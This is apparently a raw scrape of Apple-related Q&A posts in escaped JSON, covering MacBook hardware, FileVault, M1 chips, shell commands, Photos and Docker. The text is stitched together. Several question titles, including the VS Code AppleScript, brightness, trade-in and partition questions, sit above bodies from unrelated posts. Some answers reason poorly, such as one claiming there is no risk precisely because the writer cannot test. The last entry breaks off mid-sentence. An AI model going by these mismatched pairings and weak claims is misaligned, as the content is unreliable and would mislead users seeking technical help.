let it charge for an hour and check the level, but it might just be you don’t have enough sunlight. I would have the manufacturer validate yours is functioning properly if you have concerns it’s not what you need. I would use your charger for iPhones and iPads (in a pinch).\n\nA: The answer is, that the power bank is not capable of charging your MacBook Air.  The MacBook Air needs at least 3A to charge, and the power bank provides at most 2.4A.  In other words, you need a power bank with a higher output, if you want to be able to charge your MacBook.\nAs is, the MacBook will draw 3A, which will overload the power bank, and the power bank will provide a very low voltage, which is too low to be able to charge your MacBook Air.\n", "Q: What is the key mechanism on the MacBook Pro 2021 Keyboard? I'm interested to know how the MacBook Pro 2021 keyboard (released 18th October, 2021) keys compares to previous models. I.e., how does the key travel and key press mechanism compare to 2015 scissor keys, 2019 scissor keys, etc.\nThe keyboard on the MacBook Pro 2015 (and earlier models) and the external Magic Keyboard used the scissor mechanism.\nMacbook keyboards from 2016-2018 Macbook Pros used the Butterlfy mechanism. Many users complained about Butterfly because of reliability issues and the lack of key travel making it difficult to touch type.\nThe 2019 Macbook Pro adopted an updated version of the scissor-switch. But from my observation the keys had less travel than the 2015 Macbook Pro. And I've read articles suggesting that many people felt that while the 2019 keyboard was a massive improvement over the Butterfly debacle, the keyboard was not as easy to touch type on when compared  2015 Macbook pros, which had slightly more key travel.\nI was curious to know (when the information becomes available) what Apple has done with the 2021 MacBook Pro keyboard. Is the key mechanism the same as the 2019 Macbook Pro or have they done something different? Is there more travel than the 2019 Macbook Pro? Have any changes been made to make it more like the  external Magic Keyboard / 2015 Macbook Pro?\n\nA: Articles reviewing the 2021 Macbook Pros suggest that the key mechanism in the 2021 MacBook pro are identical to the 2019 16-inch MacBook Pro. So this probably means 1mm of key travel using their updated version of the scissor-switch.\nOne article states:\n\nApple says the [2021 Macbook Pro] keyboard itself is exactly the same as the 2019 16-incher in terms of mechanism and key travel. SOURCE\n\nTo put this in context, I found the following information on Reddit:\n\n*\n\n*1.0 mm - 2019 16” MBP scissor keyboard\n\n*0.7 mm - butterfly keyboard 1 mm\n\n*1.3 mm - old scissor keyboard [perhaps 2015 Macbook Pros]\n\n", "Q: What is the practical difference between an unencrypted, password-protected Mac and a FileVault encrypted Mac? In efforts to learn how to protect a new Apple-silicone laptop from theft, I'm trying to decide whether or not to use FileVault.\nI know it encrypts all your files on-the-fly, and the barrier to the files is just a password. If FileVault is off and I just set a normal user password, it's also a password barrier. How else can someone access my files with FileVault off?\n\nA: The Apple Silicon Macs all have encryption of the drive enabled at all times - no matter if you enable FileVault or not.\nThis means that the contents of the drive is encrypted (i.e. not immediately readable) - and you won't be able to just take out the drive (which is in itself a more difficult operation than usual) and read it from another computer. It is certainly not something that an average home user would ever be able to do.\nThe practical difference between having a password-protected system with FileVault disabled, and a password-protected system with FileVault enabled is how difficult it is to get to your files without knowing your password.\nFor a password-protected system with FileVault enabled, it is practically impossible for the average home user or even IT professional to get to your files without knowing your password. If you're directly targeted by a nation state, circumstances might be different - but that's not the practical world most of us live in.\nFor a password-protected system with FileVault disabled, you will ordinarily be required a password to login. However, there are ways to circumvent that and access your files, that could be accessible to home users. You're certainly exposed to flaws (bugs) in lots of different software packages that could help a malicious person gain access to your files.\nA user would be able to just boot the Mac holding down Opt-R to enter Recovery Mode and gain access to the files. On non-Apple Silicon systems, this access can be somewhat blocked by enabling a Firmware Password, which means that booting into Recovery Mode requires a password. However, for some older machines it is possible for Apple (and possibly others) to reset that Firmware password. On recent Intel machines, removing the Firmware Password automatically erases the contents of the disk.\nOn your Apple Silicon system, there's no concept of a Firmware Password as such. Instead the system automatically protects access to the Recovery Mode with your password when you have enabled File Vault.\nSo all in all, I would highly recommend enabling FileVault on your computer.\nThere's absolutely no performance impact in doing so (remember that your drive is encrypted no matter what). The main risk or concern involved in enabling FileVault is that you might forgot your password and recovery key - this can be somewhat mitigated by letting the system store a recovery key with your iCloud account.\n", "Q: How to open a folder in Visual Studio Code using AppleScript?

I'm struggling to choose between M1max and M1pro for my MacBook 2021. The only difference that could be relevant for me is 2x memory bandwidth.\nAre there any real-world usage scenarios where 200GB/s vs 400GB/s bandwidth difference can really matter on a laptop, given middle-class specs (32GB RAM, 2TB SDD) and, ideally, 5..7 years lifespan?\nMy usage patterns are basically:\n\n*\n\n*Disk-intensive data analysis: massive file decompression, plain text command line processing like JQ, sorting and other O(N log N) .. O(N^2) operations, all on filebase totaling multi-10GB\n\n\n*Heavy office usage (Excel with occasionally huge datasets; Chrome and Firefox with dozens..hundreds of tabs)\n\n\n*Massive photo editing\nChoosing M1Max over M1Pro is only a matter of $200, still: can it be worth it on 5..7-year horizon?\nI'm pretty happy with 27\" Intel-based 72GB RAM iMac 2017 as my primary workstation. MacBook will be likely a secondary device--so I'm less demanding about it.\n2021 MacBooks feature 7GB/sec SSDs, so storage speed is not that much a bottleneck as in previous gens. Still it's an order of magnitude compared to even M1's 60GB/sec RAM bandwidth.\n\nA: You cannot answer your question \"is it worth it\" unless you know how much your time is worth.\nEssentially, the memory bandwidth difference does not change which programs can be run on the computer. You can get the same results from each computer. The only difference is how fast you'll achieve them.\nIn general you can say that programs that benefit most from that increased memory bandwidth are those have a lot of accesses to the same memory over and over again.\nI.e. a file decompression program that loads in 10 GB of data from disk, reads through it once, and then writes it out to disk again, won't see any improvement. The bottle neck is the (relatively) slower disk. Also note that file decompression programs usually do not work like this and will not occupy 10 GB of RAM.\nHowever a program that analyses your data and does so by reading and writing through the same data many times over (without touching disk) - they can benefit.\nA subjective view: I don't anticipate the difference in memory bandwidth alone will radically change the user experience of working with programs such as Google Chrome, Microsoft Excel or file decompression - as mentioned in your question. On the flip-side, you mention a $200 added cost over 7 years - that is less than 8 cents a day. If your time is worth $40 per hour that means that if you can save 8 seconds a day because of the upgrade, then it is \"worth it\".\nNote that in addition to the increased memory bandwidth on the M1 Max, there's also a much larger system level cache. It is 48 MB on the M1 Max and 24 MB on the M1 Pro. For most work loads, I think this will matter much more than the increased memory bandwidth.\n\nA: Some insights from Anandtech analysis on M1 Max:\n\n*\n\n*CPU alone can max to 243 GB/sec, not more:\n\n\nM1 Max isn’t able to fully saturate the SoC bandwidth from just the CPU side\n\n\nAdding a fourth thread [DRAM bandwidth] lands us at 224GB/s and this appears to be the limit on the SoC fabric that the CPUs are able to achieve, as adding additional cores and threads beyond this point does not increase the bandwidth to DRAM at all. It’s only when the E-cores ... are added in, when the bandwidth is able to jump up again, to a maximum of 243GB/s.\n\n\n\n*Finding how to fully load bandwidth with GPU is still an open question:\n\n\n...in my testing, I’ve had extreme trouble to find workloads that would stress the GPU sufficiently to take advantage of the available bandwidth.\n\n\nFor actual 3D rendering and benchmarks, I haven’t seen the GPU use more than 90GB/s (measured via system performance counters). While I’m sure there’s some productivity workload out there where the GPU is able to stretch its legs, we haven’t been able to identify them yet.\n\n\n\n*Bottom line is: only CPU + GPU + media engines [+other parts of the chip] together can possibly utilize the 400GB/sec fully:\n\n\nWorkloads that stress CPU, GPU, media engines all at the same time would be able to take advantage of the full system memory bandwidth, and allow the M1 Max to stretch its legs and differentiate itself more from the M1 Pro and other systems.\n\n\nA: To utilize 383 GB/sec of bandwidth, this combination was used (archived):\n\n*\n\n*MatMul benchmark (GPUs only)\n\n*STREAM benchmark (20-thread CPU)\n\nBut only 172 GB/s of bandwidth by CPUs alone: efficiency + performance cores (archived).\n", "Q: M1 macbook air screen turn of on lowering brightness below minimum?

I would like to publish an IOS mobile app on the AppStore that includes a binary file as part of the bundle. The app's purpose would be to manage an iot device and that binary file would contain an OS image that can be sent to the iot device in order to upgrade it. Ideally the binary would be part of the bundled app instead of being downloaded in background by the app from a remote location.\nI was wondering if that could be an issue from the point of view of the AppStore guidelines.\n\nA: I’m not seeing any red flags in the published guidelines.\n\n*\n\n*https://developer.apple.com/app-store/review/guidelines/\nHowever, you have to make an app and submit it to TestFlight and then for sale to find out if your view of the app matches Apple staff view of it.\n\n*\n\n*https://developer.apple.com/documentation/storekit/skdownload/\nIf your app size is large, you may get rejected though for a variety of reasons (static analyzer flagging the app, app only downloads on WiFi, etc…).\nIf I were to read between the lines, it appears Apple wants to be the iOS code shipper and not take the place of providing your backend services for content distribution + code distribution. Unless you use in-app purchase to provision these binaries, your app should probably download these assets to local storage sandbox or use the files app to store the binaries. Shipping a new build just to change an embedded asset ties your hands more than it does Apple's hands. For a small enough app, it might not matter.\n\n*\n\n*https://developer.apple.com/wwdc15/214\nI would use S3 buckets or another backend personally with on demand downloads so my app was cleaner to ship and review, but maybe your design is better for your needs.

To be more specific, the current terminal theme's name.\nI've tried to check if there's something in defaults command, and when I run defaults read com.apple.terminal I can see plenty of configs including the default theme in:\n\"Default Window Settings\" = \"...my theme...\";\n\nBut not the theme(or themes) from the application that is running at the moment.\nBTW: I've checked under /System/Applications/Utilities/Terminal.app/Contents but didn't found nothing yet.\nThanks / Any ideas?\n\nA: This following AppleScript code will return the name of every theme currently being used in every Terminal window1.\ntell windows of application \"Terminal\" to set themeNames to name of current settings\n\nTo run it from Terminal, simply run the following command:\nosascript -e 'tell windows of application \"Terminal\" to return name of current settings'\n\nIt will return a comma-delimited list of the profile name for each open window in Terminal.\n\n1 Since macOS High Sierra, tabs of a window in Terminal are treated as a window programmatically in AppleScript and therefore each physical window having multiple tabs can be using different themes. There will also be no grouping in the results, so e.g. one window having e.g. two tabs programmatically the two tabs are separate windows, not tabs like in macOS Sierra and earlier.\n\nA: Do you have your customization set in your .bashrc or .zshrc file?

It does not stop Stocks from running  regularly in the background (or is it being regularly assessed to run?).

See this previous question, and this more detailed explanation.\n\n\n*You can use xargs to split a list of arguments into small-enough-to-process groups, but depending on the form of the arguments (and whether they contain various troublesome characters like whitespace, escapes, quotes etc) this can get complicated. One generally safe way to do it is to use printf '%s\\0' to print the argument list with nulls terminating it, then xargs -0 to consume the list:\n printf '%s\\0' https://example.com/prefix{1..100}.html | xargs -0 curl -O\n\nNote that any arguments that should be passed to each invocation of the utility (like the -O in this example) must be included in the xargs invocation, not the printf arg list. Also, if there are arguments that need to be passed after the big list, you need a more complex invocation of xargs.\nAlso, this may look like it shouldn't work because the huge argument list is still being passed to printf, but that's a shell builtin, not a separate executable, so it's handled inside bash itself and the limit doesn't apply.\n[BTW, I thought there must be a previous Q&A covering this, but I couldn't find one. If someone else finds a good one, please mark this question as a duplicate.]\n\nA: When you run\nwget 'https://example.com/prefix'{1..9999}'.html'\n\nthe expansion of the {1..9999} is done by the shell, resulting in an extremely long list of arguments (run echo foo{1..10} to see what happens).\nInstead, you can just run\nfor i in {1..9999}; do\n    wget 'https://example.com/prefix'${i}'.html'\ndone\n\nor (as a one-liner)\nfor i in {1..9999}; do wget 'https://example.com/prefix'${i}'.html'; done\n\nto have the shell handle the loop directly and not in the arguments passed to wget. The overall performance of the downloads is limited by the network anyway, so forking and executing 10'000 wget processes (instead of just one) doesn't have a noticeable impact.\nPS: Replace 9999 with whatever the highest number is, or use something like {1,7,9,15,22,36} for specific numbers.\n", "Q: Is it safe to trade in my MacBook Pro laptop?

That's pretty easy to line up by eye, after the fact.\n\nA: First of all, you have to check if both videos have the same frame rate.\n\nIf yes, then all you have to do is find the same spot at the beginning of both videos and sync them at the same time, the end.\nHowever, based on your question, most likely you are dealing with distinct fps, so it will be tricky. You will have to change the speed of one of the clips.\nThis will lead to: a) freeze frames (if you are slowing down) or b) dropped frames (if you are speeding up). Not a problem unless you are dealing with professional movies or premium streaming platforms.\nNow, to achieve that, I usually work using markers for remarkable events at the beginning and at the end of the videos, like this:\n\nAs you can see, the first event is in sync at both clips (green markers). But at the end of the clips, due to different frame rates (meaning speed), a second event is happening before in one of the clips (red markers).\nSo you will have to either slow down one of them or speed up the other in order to match the tempo.\nIn this case I have experimented something like this, using the speed icon and clicking \"Custom Speed\":\n\n(You may also use contrl + option + R)\nAnd try, let's say, 90% or 95%.\n\nIn my case, that was too much. Now the top clip is way too slow and the red marker is beyond the other one.\n\nThis is a perfect moment to use that handy tool at the end of the clip:\n\nIt will adjust the speed using a visual reference.\nJust click and drag so both markers are in sync.\n\nCool right? Well, not really.\nSince you are messing with the speed of the whole clip, now the green ones are slightly out of sync.\n\nDrag the top clip back so they match.\n\nOf course, at the red markers the situation isn't perfect again, but we are getting closer.\nRepeat the process a few more times, until everything is aligned.\n\nYou will notice that the custom speed is something crazy like, in my case, 95.97%\n\nThe point is, you are able to get things done.\nI know it is a very manual, weird solution, but it works.\n", "Q: Create two keyboard shortcuts for same menu bar item I want to use both CommandH and CommandW to hide Notes.app (relaunching Notes.app takes some time and I'm used to other applications not quitting when all windows are closed), but apparently in System Preferences > Keyboard > App Shortcuts I can only assign one keyboard shortcut to it.\nIs there any way for me to assign both keyboard shortcut to the same menu bar item?\n\nA: \nIs there any way for me to assign both keyboard shortcut to the same menu bar item?\n\nThough normal methods I would have to say no, and I do not know of an abnormal method that would allow it either.\n\n\nAlternate Solution\n\n*\n\n*Create an Automator Quick Action/Service with settings:\n\n\n*\n\n*Workflow receives [no input] in [Notes]\n\n\n*Add a Run AppleScript action, replacing the default code with:\n\ntell application \"System Events\" to key code 4 using command down\n\nOr use:\ntell application \"System Events\" to set visible of application process \"Notes\" to false\n\n\n\n*Save the workflow as, e.g.,: Hide Windows in Notes\n\n\n*In System Preferences > Keyboard > Shortcuts > Services > App Shortcuts, add one for Notes and the Close menu title setting it keyboard shortcut to: ⌘U\n\n\n*In System Preferences > Keyboard > Shortcuts > Services, set the keyboard shortcut for, e.g., Hide Windows in Notes to: ⌘W\n\nNow when in Notes and you press ⌘W it hides the windows instead of closing the window.\n\nNotes:\nOn some versions of macOS there is a bug in the naming convention of an Automator Quick Action/Service in that spaces cause the Quick Action/Service not to show in System Preferences > Keyboard > Shortcuts > Services.

I would preface this by saying that there are some weird PRAM/NVRAM, and a host of other weirdness that happen as you update an older Mac with newer versions of macOS.I believe that Apple has to make some simplifying assumptions as they issue upgrades and one of those is that you bought the computer when it was a current model and dutifully upgraded it as OS changes became available.\n\n*\n\n*Clear your NVRAM and install Mavericks.\n\n\n*Next, install High Sierra.

All of the folders inside Application Scripts are empty as far as I can tell\n\nA: ~/Library/Application Scripts is a directory for apps to run user-supplied scripts.  This is largely useful to sandboxed apps, as scripts in this directory gets special privileges to execute outside of the app's sandbox security restrictions.  The app can read scripts from the directory, but not write to the directory.\nAs you might imagine, there aren't that many sandboxed apps that need to execute user-supplied AppleScripts.

All you need to do is create a new paragraph style (instead of a List Style) in the Format -> (Text) Style sidebar and apply that style whenever you create a first-level list item. Here is how you can do it based on the example in the picture below:\nAfter creating a \"first-level\" item and changing its \"List Style\" to Numbered, set its \"Before Paragraph\" spacing to, for example, 6 points. An \"Update\" option will appear right next to the \"Body\" paragraph style on the sidebar. Instead of clicking on the Update, click on the Body paragraph style which will give you the list of existing paragraph styles. Then click on the \"+\" sign in the paragraph styles menu to create a new paragraph style and name it \"First-level\". In addition to spacing, you can now make other changes to the \"First-level\" paragraph style and these changes will automatically apply to any paragraph this style has already been applied to.\nThe directions above and the example below is from Pages v8.1 but I reckon the settings are quite similar to those in the version you have.

I called Apple from France at 0805 540 003. The robot said: “I see that you are calling from an iPhone. Are you calling about this iPhone?” Indeed, I was calling from an iPhone. How does the robot know that?\nThis is suspect.\n\nA: I can also only speculate about the reasons, but there are two things I can come up with:\n\n*\n\n*you have probably enabled iMessage. In order to use this service effectively, when someone sends you a message via the iOS Messages App, Apple needs to determine if you are online, then you will receive the message as an iMessage, otherwise it will be send over some mobile carrier. As the end user receiving the message there is no difference recognizable, only as the sending user you are told that the message is sent as an SMS, as you will probably be charged by your mobile carrier for it.\nTherefore Apple has your mobile phone number stored in some kind of database, and will be able to see that you are calling from an iPhone.\n\n\n*In contrast to the old times of analogue telephony, today’s calls are almost always transmitted via Voice over IP. And in the headers of IP packages there are multiple variables in which information about the packet sending device are stored and transmitted. Therefore the receiving server knows how to „encode“ the message it wants to return. By this Apple could also determine from what kind of device you are calling.\nPlease keep in mind that I am in no kind an Apple employee or something, so my answer is only some „targeted guessing“ based on what I know has to go on in the background during calls and text messages.\n", "Q: For \"Live Text\" in macOS Monterey, can you have it scan all of your photos, and use the Live Text OCR'd content to search against in Spotlight Search? MacOS Monterey includes \"Live Text\", which is OCR to use when viewing your photos, including handwriting recognition.\nBut I have thousands of photos, many of which are photos of presentations, pictures of PowerPoint slides taken from my seat in the audience, etc.  I also have hundreds of screenshots with text from YouTube.\nI'd like the Mac to slowly work its way through all of my photos and add the recognized text as some type of searchable attribute, attached to each photo.\nSo can I have Live Text OCR my entire Photo Library?\n\nA: For reasons that are beyond me, this does not seem to be possible on macOS Monterey — at least not as of version 12.1. If anyone can prove me wrong, I would be delighted! But a quick perusal of the output of mdimport -X does not seem to reveal any relevant metadata relating to public.image. This is really astounding; it seems like a major oversight.\nWhat makes it even more mystifying is that you can search images by embedded text on iOS 15! If you go to the system-wide search on an iPhone (pull down on the home screen) and enter some text there, there should be a \"Photos from Apps\" section in the results with photos that contain this text.\nLet's hope this ability gets added to future version of macOS!\nEdit on 7 June 2022:\nDuring the WWDC 2022 keynote yesterday, it was revealed (briefly!) that this feature should finally be included in the version of Photos that ships with macOS Ventura, later this year.\n\nA: On macOS Monterey, your and wjv’s expectations were a common assumption, but the implementation was purely a just in time implementation. No such database of all text is compiled, just the neural engine or intel chip is activated when text may be present.\n\nLive Text appears straightforward: open an image containing recognisable text, macOS runs OCR on it, and lets you select what it succeeds in recognising. But when I came to read the log to confirm how this worked, that wasn’t what happened at all.\n\nhttps://eclecticlight.co/2022/06/05/last-week-on-my-mac-the-magic-is-how-not-what/\nWhether this bulk scanning is something that remains “on demand” or gets turned into the database you seek will play out as we all see what is released in WWDC 22 and betas of macOS Ventura start shipping.\nFootnote 4 of https://www.apple.com/macos/macos-ventura-preview/ seems to indicate spotlight can search all local image files for text, so it may not be able to do all of that on demand like the current implementation.\n\nA: Wow, on Ventura, once your mac finishes indexing, it does seem like it indexes text from images.  I'm not sure if it's a full index, or just running OCR on pics that it thinks might match.  But for example, I had taken pictures of a prescription drug I was interested in.  Now, after I wait for the index bar to complete, it pulls back the multiple times I took pictures of the TV set (apparently I've been interested in that med for a while, shows pics even from my old tv)\nSo I don't know how deep it goes, or how fast, but there's something for sure new in Ventura 13.0\n", "Q: Syncing messages, calendar via iCloud between restored iPhone to one migrated using Move to iOS For many years I used iPhone, but then tried to use Android. I'm now back on an iPhone. On the new iPhone I restored it with the last backup from my old iPhone. All is good.\nI used \"Move to iOS\" to migrate my mom's Android to iPhone and that worked very well.\nI thought that - after I had restored my old backup to the new iPhone - that I could use \"Move to iOS\" to transfer data to the new iPhone. Apparently you can't without wiping it.\nMy question is: Could I take my old iPhone which is now obsolete and use \"Move to iOS\" to migrate from the Android phone to that. Then after it has migrated, sign in with my Apple ID. Would it then sync messages and calendar to iCloud and now be available on both iPhones?\nI could try it out, but I would be rather sad if something got deleted. I would like to know if anyone had experience doing this or something similar?\n\nA: I think this is perfectly safe and will work as long as you look carefully select merge and not override. I cannot simulate such a test now, and therefore there is most likely no risk at all.\n", "Q: Hello people , i have little truble with my recovery menu Common guys... i install my macos big sur img on vmware, and me need enter into recovery menu, but when i trying do it, i press and holding command+r and nothing to hapening .Instead entering into recovery menu , i face to face with follow truble that i capture and add in my youtube channel:\nHere my demonstrate: https://www.youtube.com/watch?v=s57U9Y0mUdU\nWhat it is? Help me guys,me need disable csruit into safe mode to be change my screen resolution,\nand i cannot use no one methods for some reason.\n\nA: I wouldn’t bother with recovery mode if you are running in a hypervisor. You can change the resolution of the “hardware” with drivers and a configuration file in vmware by editing the vmx file.\nCan you ask a follow on question listing your specific version of vmware and your host OS and any non-standard steps you took on that setup if you need further help with your virtualization config. They can be finicky and often we need specific details to solve issues like yours.\n\nA: I have Big Sur (macOS 11.5.1) installed in a VMware virtual machine. Below is my configuration.\nVMware Fusion Player version 12.1.2 (17964953)\nHost operating system: Catalina (macOS 10.15.7)\nHost machine: Apple iMac (21.5-inch, Late 2013)\nThe initial screen resolution after installing was set to 1024x768 and could not be changed on the Display pane of System Preferences in Big Sur. However, after installing \"VMware Tools\" in Big Sur, the screen resolution automatically updates when the virtual machine window is resized by using the mouse. I can increase the resolution up to the current resolution of the iMac display. The maximum resolution of the iMac display is 1920x1080.\nIf installing VMware Tools, does not solve your screen resolution problem, then you might consider updating your question to include the following.\nVMware Fusion Player version\nHost operating system\nHost machine\nAdditional Comments\n\n*\n\n*The VMware virtual firmware does not recognize any of the Mac startup key combinations.\n\n\n*The closest you can come to booting to Recovery Mode for Big Sur would be to create a virtual bootable installer for macOS Big Sur, then boot from this installer.

Those are not allowed under Big Sur (or Catalina).\nI can't believe Anaconda is that broken on the Mac, so did you make that choice when you originally installed it?\nGood information on this topic is here: Where does the upgrade to macOS Catalina and Big Sur move root \"/\" directory files?\n", "Q: Macbook pro late 2011 good replacement battery? I'm having trouble finding a good MacBook pro battery that has an original voltage of 16.5V 3.65A max. Even for any laptop, I can't find the one with a voltage of 16.5V. Unless the information on the back of my MacBook is not the correct info I should be looking at. Also at this point should I even fix and upgrade this Macbook pro in late 2011 13 inches.\n\nA: The indicated voltage is not a problem if you can find a compatible battery.\nIf you search on the net for \"A1278 Battery Macbook Pro\" you will be spoiled for choice. On the other hand, it's a bit of a lottery and you should not expect to find a quality equivalent to that of the original batteries.\nFor the second question, on a 2011 MBP model you can put 16 GB of Ram and an SSD. You should still know that the 13\" and 15\" Late 2011 models (unlike the 13\" Early 2011) suffer from a frequent problem with the graphics chip on the motherboard.\n", "Q: Getting files from iPad that can't be seen in Finder I have been using Anki for studying.  Somehow, all its files disappeared from my MacBook Pro (either that or Migration Assistant failed to copy them from the old machine).  I can't find them in Time Machine, either!\nBut they are still on the iPad.  The iPad app does its own backups periodically, but they do not include images and audio.  Is there a way to get at them in the iPad backups?\n\nA: The following instructions work on macOS 11.6 and other recent versions (see caveats at end):\nIn Finder, with the iPad (or iPhone) attached, select the device.\nClick \"Manage Backups\"\nIn the selected backup directory, open \"Manifest.db\" in sqlite3 or in a GUI SQLite browser you've installed from the App Store.\nselect distinct domain from Files; and find the domain for the app you want to get files from.\nGet a list of all that app’s files with\nselect fileID, relativePath \nfrom Files \nwhere \"domain\" is \"AppDomain\";\n\n(substitute the domain you identified)\nThe first column, fileID, is the name of the backed up file in a subdirectory of the backup.  Its parent directory is named by the first two characters of the fileID.  The second column is the filename on the iPad or iPhone.\nEdit the results into a script to get the files where you want them on your laptop.  Or if you only want a few files, use the results to navigate in Finder.\nCaveats:\n\n*\n\n*If you don't understand the above, you might not want to tamper with the mobile backup.  I do understand it, and yet I still trashed mine and had to restore it from Time Machine.\n\n*Something similar should work in other versions of macOS.\n\n", "Q: Understanding Airpods Pro pairing behaviour I got a pair of Airpod Pros last month (Sep 2021). I paired them with my phone initially, but noticed quickly that this means they automatically pair with my MacBook Air as well. For a while using both felt smooth and I had no trouble, but in the last week or so it has suddenly started feeling janky.\nMy main annoyance is that when I have them paired to my laptop and I'm listening to music (on Spotify), sometimes even just picking up my phone and looking at the locked screen (which FaceID unlocks) will switch the pairing to the phone and my music stops, and I have to manually click at things for a while to get them back to the laptop and the music playing again. I think this happens when some other audio app is on top of the phone (say if I listened to podcasts on the phone earlier).\nCan anyone explain the logic to how the Airpods decide which device they should be paired to? And is there a way to stop them jumping to my phone by their own decision even in the middle of music listening?\n\nA: Answering myself that the simplest fix to the jumping was to switch the pairing mode from \"automatic\" to \"when last connected to this device\" in the AirPods' settings on both devices.\nI'm still not entirely clear on the logic of how the \"automatic\" pairing decides where to connect.\n\nA: This is a common race condition and depends highly on your setup and devices in the vicinity of AirPods. On my Mac, even if AirPods are connected to my iPhone, they will switch to my Mac once it is booted up.\nIn my case, it is the system Sound of Mac, that wants to play and searches for the nearest output device\n", "Q: Is the homebrew warning \"We (and Apple) do not provide support for this old version.\" safe to ignore? Today I ran brew upgrade on my Mojave (10.14.6) setup and was presented the following warning:\nWarning: You are using macOS 10.14.\nWe (and Apple) do not provide support for this old version.\nYou will encounter build failures with some formulae.\n\nIs this warning safe to ignore and brew will only upgrade to package versions that support my OS version or will it just brute-force upgrade everything and potentially fail?\nI have no wish to upgrade from Mojave due to Apple's change in policy after that.\n\nA: Yes, the warning in question is safe to ignore.\nHomebrew will only install/upgrade to package version build specifically for your installed OS version.\n\nA: I wouldn’t ignore it. It’s important - things likely won’t work as expected and you have to do extra diligence on ensuring you get security and stability patches. Same with running an unsupported macOS version but with homebrew, at least the source is open and easier to patch DIY than Apple tools are to tinker with the core OS.\n\n*\n\n*Does it mean you can’t proceed? No\n\n*Should you think about it, and regularly check your risk level? Yes\n\n\nA: It is not out of support until 30th November. Typical of Homebrew to look to the future.\n", "Q: Are M1 Macbooks good for container-based software development (Docker...) in Q4/2021? I need to buy a new MacBook Pro; as far as I can tell, the M1 is significantly superior than my 2019 MBP in any aspect, so I would not like to get an older model even if I could.\nOne thing that gives me pause is that in the past I have been using Parallels to run docker-machine (plus a Win10 VM for very few inevitable Windows-only applications in my company).\nI can avoid having a Win10 VM, but being able to work with docker (more concrete: build Dockerfiles with any kind of application compatible with docker - no matter if it's based on containerd or whatever) is crucial to me. I do not require to then push my docker images anywhere, the images on any other servers will be built on a Linux-based CI/CD system. I only require to be able to use some pretty standard public base images (i.e., alpine, debian, ubuntu, python, things like that) and am also able to maybe switch to different generic base images if they are available.\nOn my old Intel-based MBP I am using docker-machine, which seems discontinued (I see little or no changes in their GitHub repository for years).\nDocker Desktop seems still to be in an experimental state.\nWhat are your experiences with this? Are you using a M1-based Mac for software development, is this still an issue? Or is it \"fixed\" and some good solution exists?\n\nA: I say yes indeed. I'm all in on the future direction Apple has staked for Apple Silicon and use M1 / iPad for everything I can and will set up a linux VM or pay for cloud VM as needed when I have to have code that just isn't possible without Intel or kernel extensions for OS prior to Big Sur. I haven’t installed Rosetta 2 on my daily driver yet as well.\n\n*\n\n*Docker was GA for Apple Silicon April 15, 2021 and now doesn’t require Rosetta - https://docs.docker.com/desktop/mac/release-notes/\n\n*VMware is still in preview, but October update should drop soon - https://blogs.vmware.com/teamfusion/2021/09/fusion-for-m1-public-tech-preview-now-available.html\n\n*VS Code and rosetta / homebrew have been awesome for me in testing and peers using it in production (especially since they work so well with cloud in Azure and work pays for that service) - https://devblogs.microsoft.com/visualstudio/developing-on-a-m1-mac-with-visual-studio-for-mac/\nYou can certainly find some pain points if you go looking at software revolving around kernel extensions or not updated in the last 24 months for general OS changes. Hopefully you can refine any big show stoppers for your critical projects and buy with confidence after some research and other people share their experience. I personally find instant on and the battery life and performance of the initial Air so good, I can't imagine I'll ever get an intel again other than maybe next year's bump on a Mac Pro if I decide to retire my 2013 Mac Pro home lab which takes much of my legacy code lifting off my portable.\n", "Q: Which is the minimum iOS version and iPhone version require to be able to use a virtual background in Microsoft Teams?

I see on https://www.windowscentral.com/teams-ios-now-supports-custom-background-images?amp that the virtual background option is available on iOS but wonder what the phone requirements are.\n\nA: From https://docs.microsoft.com/en-us/microsoftteams/hardware-requirements-for-the-teams-app\n\nSupport is limited to the two most recent major versions of iOS. For example, when a new, major version of iOS is released, the iOS requirement is the new version and the most recent versions that preceded it. The optional Blur my background video effect on iOS requires an operating system of iOS 12 or later, compatible with the following devices: iPhone 7 or later, iPad 2018 (6th generation) or later, and the iPod touch 2019 (7th generation).\n\nI also found a page announcing that support for iOS 13 will end this month. But iPhones 7 and later will run iOS 14 (and 15) so this shouldn't be a problem.\n", "Q: how to merge two partitions that one of their size can not be changed?

How to fix? Apple Photos is stuck forever in face recognition and photo curation.\nHow can I get it working again?\nI) Photo Library Charateristics\nI mentioned that I had one main system photo library (being mostly local only, iCloud only for few shared albums) and a private library. And described there characteristics in great detail, to find possible causes. Did all not matter!\nII) Main fix strategies found online 2020-2021:\nAs links here, in detail as individual answers below:\n\n*\n\n*✅ Fully enable SIP and uninstall unsigned 3rd party Kernel extension(s)\n\n\n*\n\n*Working solution eventually! \n\n\n\n*Give it some time\n\n*Repair the library\n\n*Find corrupted or unsupported files and remove them\n\n*Deactivate login items, do some cleanup in cache folders, etc\n\n*iCloud on/off/re-syncing based approaches\n\nA: Give it some time.\n\n*\n\n*Let it run overnight with energy saving off.\n\n*Give it (= the background process photoanalysisd) more time (days, weeks).\n\n*Variations: Photos.app running, in background, or off at all.\n\n❌ Worked never or only once. Never permanently.\nTechnically it can be observed that photoanalysisd can run with or without Photos.app running. But some noticed it is important that Photos.app is running but in background and the system needs to be overall idle for a certain time, before photoanalysisd kicking in.\nThose who continue suffering observe that photoanalysisd runs periodically, but always only shortly w/o accumulating much CPU time and Apple Photos showing no progress at all. Suspicion is that photoanalysisd chokes on some bad input. But due to lack of a log file or calling it manually with verbose output we can only speculate.\n\nA: Uninstall MacPorts? Suspicion only. No conclusion yet.\n\n*\n\n*Ca. 2021-10-25: Properly uninstalled very old leftover installation of MacPorts.org which had: Own group, own user, own launch daemon(s) and stuff in .bashrc and .zshprofile.\n\n*Ca. 2021-10-25: The mini private library (800MB) which I copied into a fresh user meanwhile completed curation and face-detection.\n\n*\n\n*Maybe MacPorts (leftovers) and Apple Photos conflicted? Not sure whether causal or correlation only.\n\n\n\n*2021-10-27: photoanalysisd of my main system library now continuously works and accumulates CPU time! I leave Apple Photos.app in foreground on \"Library\" in \"Day View\". Whenever I observe photoanalysisd to go to 0% CPU, switching to Apple Photos, makes photoanalysisd reliably kick in again and not only accumulate an extra of 1-2secs of CPU time but some few more minutes of CPU time! \"People\" still at \"0 Photos Scanned\" but my hope is this is simply due to curation being performed before face detection. Really hope that the proper uninstallation of MacPorts was the cause and now it's only a matter of \"enough idle time to process\". The next hours/days will show. Will update you about progress!\n\n\nA: Re-enable System Integrity Protection (SIP) and/or uninstall 3rd party Kernel extension(s)\n\n*\n\n*ℹ️ I had used SsdPmEnabler which as an unsigned kernel extension needs SIP 